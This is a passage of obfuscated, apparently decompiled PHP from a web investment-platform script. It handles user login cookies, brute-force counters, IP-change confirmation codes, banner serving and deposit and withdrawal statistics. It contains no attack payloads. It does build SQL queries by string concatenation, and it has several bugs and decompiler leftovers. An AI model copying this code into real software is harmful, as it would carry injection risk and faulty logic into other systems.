    $elnlcoeubO = '' . ' and last_access_time + interval 30 minute > now() and last_access_ip = \'' . $elnlcDuaK . '\'';
    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      $elnlcoeubO = '';
    }

    list ($elnlcOzjJ, $elnlcOSCl) = mb_split ('-', $elnlckMaH, 2);
    $elnlcOzjJ = sprintf ('%d', $elnlcOzjJ);
    $elnlcOSCl = elnlcnczen ($elnlcOSCl);
    if (0 < $elnlcOzjJ)
    {
      $q = '' . 'select *, date_format(date_register, \'%b-%e-%Y\') as create_account_date, now() - interval 2 minute > l_e_t as should_count from hm2_users where id = ' . $elnlcOzjJ . ' and (status=\'on\' or status=\'suspended\') ' . $elnlcoeubO;
      $elnlchGkPU = mysql_query ($q);
      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
      {
        if (($elnlcSuVc[$elnlcsyENS['elnlcAcsG']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlctTLrz']] != ''))
        {
          setcookie ('password', '', time () + 630720000);
          $_SESSION[$elnlcsyENS['elnlcuNxa']] = '';
          header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
          elnlcnooln ($elnlcUazB);
          exit ();
        }

        $elnlcQyme = $elnlcCgqPK[$elnlcsyENS['elnlcnDyB']];
        $elnlctUmAS = substr ($elnlcQyme, 5, 20);
        if ($elnlcOSCl == md5 ($elnlctUmAS))
        {
          $elnlcgcnET = $elnlcCgqPK;
          $elnlcgcnET[$elnlcsyENS['elnlcpicy']] = $elnlcsyENS['elnlctNxTK'];
          $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']] = array ();
          $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']] = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcEoNu']]);
          $q = '' . 'update hm2_users set last_access_time = now() where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          if (!(mysql_query ($q)))
          {
            exit (mysql_error ());
            (bool)true;
          }

          continue;
        }
        else
        {
          $q = 'update hm2_users set bf_counter = bf_counter + 1 where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          mysql_query ($q);
          if (($elnlcSuVc[$elnlcsyENS['elnlcAcsG']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcAglxS']] == $elnlcSuVc[$elnlcsyENS['elnlcbTGA']]))
          {
            $elnlcisiv = elnlcpfqe (50);
            $q = '' . 'update hm2_users set bf_counter = bf_counter + 1, activation_code = \'' . $elnlcisiv . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
            mysql_query ($q);
            $elnlcRuFoK = array ();
            $elnlcRuFoK[$elnlcsyENS['elnlctTLrz']] = $elnlcisiv;
            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
            $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
            $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
            $elnlcRuFoK[$elnlcsyENS['elnlcQEKp']] = $elnlcSuVc[$elnlcsyENS['elnlcbTGA']];
            elnlcsius ('brute_force_activation', $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
            setcookie ('password', '', time () + 630720000);
            $_SESSION[$elnlcsyENS['elnlcuNxa']] = '';
            header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
            elnlcnooln ($elnlcUazB);
            exit ();
            continue;
          }

          continue;
        }
      }
    }
  }

  if (($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 0 AND $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcnfEbf']))
  {
    header ('Location: ?a=login&follow=return_referral_commission');
    exit ();
  }

  if (($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1 AND $elnlcgcnET[$elnlcsyENS['elnlcMSQOx']] == 1))
  {
    elnlcfltmc ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
  }

  if ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] == 1)
  {
    $elnlcgcnET[$elnlcsyENS['elnlcpicy']] = $elnlcsyENS['elnlcmjUx'];
  }

  if ($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1)
  {
    $elnlcgcnET[$elnlcsyENS['elnlcBGGit']] = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcFNLpS']]);
    if ((time () - 900 < $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] AND $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] != ''))
    {
      if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlckUUEh'])
      {
        if ($elnlcWodOE[$elnlcsyENS['elnlcjmkMv']] == $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']])
        {
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpFnSR']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcWkuzj']] = $elnlcUAAU[$elnlcsyENS['elnlccqWO']];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] = $elnlcsyENS['elnlcmjUx'];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] = '';
          $elnlcEabU = elnlcnczen (serialize ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']]));
          $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
          header ('Location: ?a=account');
          exit ();
        }

        header ($elnlcsyENS['elnlcksSa']);
        exit ();
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlckUUEh'])
      {
        if ($elnlcWodOE[$elnlcsyENS['elnlcjmkMv']] == $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']])
        {
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpFnSR']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcWkuzj']] = $elnlcUAAU[$elnlcsyENS['elnlccqWO']];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] = $elnlcsyENS['elnlcmjUx'];
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] = '';
          $elnlcEabU = elnlcnczen (serialize ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']]));
          $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
        }

        header ($elnlcsyENS['elnlcksSa']);
        exit ();
      }

      $elnlcfhFg->display ($elnlcsyENS['elnlcChQJS']);
      exit ();
    }

    $elnlcMnnuA = elnlcpfqe (7);
    $elnlcRuFoK = array ();
    $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
    $elnlcRuFoK[$elnlcsyENS['elnlcKPxo']] = $elnlcUAAU[$elnlcsyENS['elnlccqWO']];
    $elnlcRuFoK[$elnlcsyENS['elnlcnATpb']] = $elnlcMnnuA;
    $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
    if (${$elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']]} == $elnlcsyENS['elnlcfJiFu'])
    {
      $elnlctLVvv = preg_replace ('/\\.(\\d+)$/', '', $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpFnSR']]);
      $elnlcnhPz = preg_replace ('/\\.(\\d+)$/', '', $elnlcUAAU[$elnlcsyENS['elnlcnGMB']]);
      if ($elnlctLVvv != $elnlcnhPz)
      {
        $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] = $elnlcMnnuA;
        $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] = time ();
        elnlcsius ('acsent_user', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
        $elnlcEabU = elnlcnczen (serialize ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']]));
        $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
        (mysql_query ($q) OR print mysql_error ());
        header ($elnlcsyENS['elnlcksSa']);
        elnlcnooln ($elnlcUazB);
        exit ();
      }
    }
    else
    {
      if ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']] == $elnlcsyENS['elnlcdWyJ'])
      {
        if ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpFnSR']] != $elnlcUAAU[$elnlcsyENS['elnlcnGMB']])
        {
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] = $elnlcMnnuA;
          $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] = time ();
          elnlcsius ('acsent_user', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
          $elnlcEabU = elnlcnczen (serialize ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']]));
          $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
          (mysql_query ($q) OR print mysql_error ());
          header ($elnlcsyENS['elnlcksSa']);
          elnlcnooln ($elnlcUazB);
          exit ();
        }
      }
    }

    if ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcuSTO']] == $elnlcsyENS['elnlcqiiQs'])
    {
      if ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcWkuzj']] != $elnlcUAAU[$elnlcsyENS['elnlccqWO']])
      {
        $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcjmkMv']] = $elnlcMnnuA;
        $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcaabk']] = time ();
        elnlcsius ('acsent_user', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
        $elnlcEabU = elnlcnczen (serialize ($elnlcgcnET[$elnlcsyENS['elnlcBGGit']]));
        $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
        (mysql_query ($q) OR print mysql_error ());
        header ($elnlcsyENS['elnlcksSa']);
        elnlcnooln ($elnlcUazB);
        exit ();
      }
    }

    $q = 'select type, sum(actual_amount) as s from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' group by type';
    $elnlchGkPU = mysql_query ($q);
    $elnlcBmFIu = $elnlcsyENS['elnlcmjUx'];
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      if ($elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] == $elnlcsyENS['elnlcULrED'])
      {
        $elnlcgcnET[$elnlcsyENS['elnlcisWd']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcvgzxW']]), 2);
      }

      if ($elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] == $elnlcsyENS['elnlcwSMlK'])
      {
        $elnlcgcnET[$elnlcsyENS['elnlcvAMt']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcvgzxW']]), 2);
      }

      $elnlcBmFIu += $elnlcCgqPK[$elnlcsyENS['elnlcvgzxW']];
    }

    $elnlcgcnET[$elnlcsyENS['elnlcTcMv']] = number_format (abs ($elnlcBmFIu), 2);
  }

  if (((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] != 'show_validation_image' AND extension_loaded ('gd')) AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
  {
    session_start ();
    $elnlcNLeRg = $_SESSION[$elnlcsyENS['elnlcAHrk']];
    if (!$elnlcNLeRg)
    {
      $elnlcNLeRg = elnlcshwnc (10, 0);
    }

    define ('VN_SAVED', $elnlcNLeRg);
    $elnlcWTPp = elnlcshwnc ($elnlcSuVc[$elnlcsyENS['elnlcQMrd']], ($elnlcSuVc[$elnlcsyENS['elnlcNmjU']] ? 2 : 0));
    $_SESSION[$elnlcsyENS['elnlcAHrk']] = $elnlcWTPp;
    session_register ('validation_number');
    $elnlcgcnET[$elnlcsyENS['elnlcEctmv']] = $elnlcsyENS['elnlctNxTK'];
    $elnlcgcnET[$elnlcsyENS['elnlcGxnUP']] = session_name ();
    $elnlcgcnET[$elnlcsyENS['elnlcKHell']] = session_id ();
    $elnlcgcnET[$elnlcsyENS['elnlcEpES']] = rand ();
  }

  if (($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1 AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH']))
  {
    $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
    $q = 'select ip, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as last_login from hm2_user_access_log where user_id = ' . $elnlckapu . ' order by id desc limit 1, 1');
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcnLtDg = array ();
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcfhFg->assign ('last_access', $elnlcCgqPK[$elnlcsyENS['elnlcRheS']]);
      $elnlcfhFg->assign ('last_ip', $elnlcCgqPK[$elnlcsyENS['elnlctDSvC']]);
    }
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcWukD'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
  {
    $elnlckapu = sprintf ('%d', $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]);
    $q = '' . 'update hm2_users set stat_password = \'\' where id = ' . $elnlckapu;
    mysql_query ($q);
    header ('Location: ?a=edit_account');
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcyrTk'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
  {
    $elnlckapu = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcLbvLL']]);
    $q = '' . 'delete from hm2_history where id = ' . $elnlckapu . ' and type=\'withdraw_pending\' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
    mysql_query ($q);
    header ('Location: ?a=withdraw_history');
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (0 < intval ($elnlcgcnET[$elnlcsyENS['elnlcLbvLL']]))
  {
    $elnlckapu = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
    $q = 'select ip, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%e %b, %k:%i\') as last_login from hm2_user_access_log where user_id = ' . $elnlckapu . ' order by id desc limit 1, 1');
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcgcnET[$elnlcsyENS['elnlcRheS']] = $elnlcCgqPK[$elnlcsyENS['elnlcRheS']];
      $elnlcgcnET[$elnlcsyENS['elnlcpFnSR']] = $elnlcCgqPK[$elnlcsyENS['elnlctDSvC']];
    }

    $elnlcgcnET[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
  }

  $elnlcfhFg->assign ('userinfo', $elnlcgcnET);
  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcodxdp'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == '';
  }

  $elnlcfhFg->assign ('frm', $elnlcWodOE);
  if ($elnlcSuVc[$elnlcsyENS['elnlcCmNuo']] == 1)
  {
    if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcxiLbw'])
    {
      $elnlckapu = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcLbvLL']]);
      $f = @fopen ('' . './tmpl_c/banners/' . $elnlckapu, 'rb');
      if ($f)
      {
        $elnlcNmtp = fread ($f, filesize ('' . './tmpl_c/banners/' . $elnlckapu));
        header ('Content-type: image/gif');
        print $elnlcNmtp;
        fclose ($elnlcITMy);
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlccQasE']] != 'no')
      {
        $q = '' . 'update hm2_users set imps = imps -1 where imps > 0 and id = ' . $elnlckapu;
        (mysql_query ($q) OR print mysql_error ());
      }

      exit ();
    }

    $q = 'select count(id) as col from hm2_users where imps > 0 and bnum > 0';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $z = rand (1, $elnlcCgqPK[$elnlcsyENS['elnlckNCf']]) - 1;
      $q = '' . 'select bnum, burl from hm2_users where imps > 0 and bnum > 0 order by id limit ' . $z . ', 1';
      ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
      while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
      {
        $elnlcfhFg->assign ('banner_ext_bnum', $elnlcUpbus[$elnlcsyENS['elnlczpJj']]);
        $elnlcfhFg->assign ('banner_ext_burl', $elnlcUpbus[$elnlcsyENS['elnlchGbPt']]);
      }
    }
  }

  if (($elnlcUAAU[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcjCSJ'] AND $elnlcfhFg->template_dir == './tmpl_pirexfund/'))
  {
    $elnlcSuVc[$elnlcsyENS['elnlcvAnU']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcumRDd'])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcvAnU']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH'])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcvAnU']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ((($elnlcSuVc[$elnlcsyENS['elnlchqhn']] AND ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == '' OR $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcodxdp'])) OR $elnlcSuVc[$elnlcsyENS['elnlcvAnU']]))
  {
    ($elnlcfPwVh = $elnlcSuVc[$elnlcsyENS['elnlcNmpb']] OR 5);
    $elnlcgPjjO = '';
    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
    {
      if (0 < $elnlcgcnET[id])
      {
        $elnlcgPjjO = '' . ' where lang = ' . $elnlcgcnET[$elnlcsyENS['elnlcuQjiT']] . ' and private in (1, 0) ';
      }
      else
      {
        $elnlcgPjjO = ' where lang = 1 and private = 0 ';
      }
    }

    $q = 'select 
                 *,
                 date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'%b-%e-%Y %r\') as d
           from 
                 hm2_news 
           ' . $elnlcgPjjO . '
           order by 
                 date desc
           limit 
                 0, ' . $elnlcfPwVh);
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcrczw = array ();
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      if ($elnlcCgqPK[$elnlcsyENS['elnlcDuyqU']] == '')
      {
        $elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']] = strip_tags ($elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']]);
        $elnlcCgqPK[$elnlcsyENS['elnlcDuyqU']] = preg_replace ('/^(.{100,120})\\s.*/', '' . '$1...', $elnlcCgqPK[$elnlcsyENS['elnlcMoSVM']]);
      }

      $elnlcCgqPK[$elnlcsyENS['elnlcDuyqU']] = preg_replace ('/
/', '<br>', $elnlcCgqPK[$elnlcsyENS['elnlcDuyqU']]);
      array_push ($elnlcrczw, $elnlcCgqPK);
    }

    if (sizeof ($elnlcrczw) == 0)
    {
      $elnlcSuVc[$elnlcsyENS['elnlchqhn']] = $elnlcsyENS['elnlcmjUx'];
      $elnlcfhFg->assign ('settings', $elnlcSuVc);
    }
    else
    {
      $elnlcfhFg->assign ('news', $elnlcrczw);
    }
  }
  else
  {
    $elnlcSuVc[$elnlcsyENS['elnlchqhn']] = $elnlcsyENS['elnlcmjUx'];
    $elnlcfhFg->assign ('settings', $elnlcSuVc);
  }

  $elnlcgvAk = array ();
  if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
  {
    $s = @file ('stats.php');
    $elnlcgvAk = unserialize ($s[0]);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcsBsC'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcHxFT']))
  {
    $elnlctLVvv = $elnlcnhPz = $elnlcsyENS['elnlcmjUx'];
    $q = 'select sum(amount) as sm from hm2_history where type=\'withdrawal\' or type=\'withdraw_pending\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlctLVvv = abs ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']]);
    }

    $q = 'select sum(amount) as sm from hm2_history where type=\'deposit\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcnhPz = abs ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']]);
    }

    $p = 'N/A';
    if (0 < $elnlcnhPz)
    {
      $p = sprintf ('%0.2f', abs ($elnlctLVvv * 100 / $elnlcnhPz));
    }
    else
    {
      $p = 'N/A';
    }

    $elnlcfhFg->assign ('stat_withdraw_percent', $p);
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcNygV'])
  {
    $q = 'select * from hm2_types order by ordering';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $l = '';
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'select sum(amount) as sm from hm2_deposits where type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
      ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
      $s = '0.00';
      while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
      {
        $s = sprintf ('%0.2f', $elnlcUpbus[$elnlcsyENS['elnlcwSUpn']]);
      }

      $l .= '' . 'Deposit to ' . $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']] . ': $' . $s . '<br>';
    }

    $elnlcfhFg->assing ('plans_statistic', $l);
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcOqItU'])
  {
    $elnlcnnOT = array ();
    $q = 'select count(distinct(user_id)) as cnt, type_id from hm2_deposits where status = \'on\' group by type_id';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcnnOT[$elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]] = $elnlcCgqPK = $elnlcCgqPK[$elnlcsyENS['elnlchvME']];
    }

    $elnlcfwHMM = array ();
    $q = 'select id, name from hm2_types where closed = 0 and status = \'on\' order by ordering asc';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcCgqPK[$elnlcsyENS['elnlchvME']] = intval ($elnlcnnOT[$elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]]);
      array_push ($elnlcfwHMM, $elnlcCgqPK);
    }

    $elnlcfhFg->assign ('range_stats', $elnlcfwHMM);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] == 1 AND $elnlcSuVc[$elnlcsyENS['elnlcmPAwd']] == 1))
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
    {
      $elnlcSuVc[$elnlcsyENS['elnlcUuPI']] = $elnlcgvAk[$elnlcsyENS['elnlcEjUh']];
    }
    else
    {
      $q = 'select count(id) as col from hm2_users where last_access_time + interval 30 minute > now()';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      $elnlcSuVc[$elnlcsyENS['elnlcUuPI']] = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcJaus']] == 1))
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
    {
      $elnlcSuVc[$elnlcsyENS['elnlcgksxq']] = $elnlcgvAk[$elnlcsyENS['elnlcqlfn']];
    }
    else
    {
      $q = 'select count(id) as col from hm2_users where id > 1';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      $elnlcSuVc[$elnlcsyENS['elnlcgksxq']] = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcOmUCS']] == 1))
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
    {
      $elnlcSuVc[$elnlcsyENS['elnlcRwKF']] = $elnlcgvAk[$elnlcsyENS['elnlcbJVkJ']];
    }
    else
    {
      $q = 'select count(distinct user_id) as col from hm2_deposits ';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      $elnlcSuVc[$elnlcsyENS['elnlcRwKF']] = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcwNpK']] == 1))
  {
    $q = 'select count(distinct user_id) as col from hm2_deposits where actual_amount > ' . sprintf ('%.02f', $elnlcSuVc[$elnlcsyENS['elnlciSEu']]);
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    $elnlcSuVc[$elnlcsyENS['elnlcQABa']] = $elnlcCgqPK[$elnlcsyENS['elnlckNCf']];
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcKrfp']] == 1))
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcNoDM']] == 1)
    {
      $elnlcSuVc[$elnlcsyENS['elnlcSrNqA']] = number_format ($elnlcgvAk[$elnlcsyENS['elnlcisWd']], 2);
    }
    else
    {
      $q = 'select sum(amount) as sum from hm2_deposits';
      ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
      $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
      $elnlcSuVc[$elnlcsyENS['elnlcSrNqA']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcHSGM']], 2);
    }
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcksTf']] == 1))
  {
    $q = '' . 'select sum(amount) as sum from hm2_deposits where to_days(deposit_date) = to_days(now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour)';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    $elnlcSuVc[$elnlcsyENS['elnlcIReJ']] = number_format ($elnlcCgqPK[$elnlcsyENS['elnlcHSGM']], 2);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlczhcB']] AND $elnlcSuVc[$elnlcsyENS['elnlcMNAm']] == 1))
  {
    $q = '' . 'select sum(amount) as sum from hm2_history where to_days(date) = to_days(now() + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour) and type=\'withdrawal\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
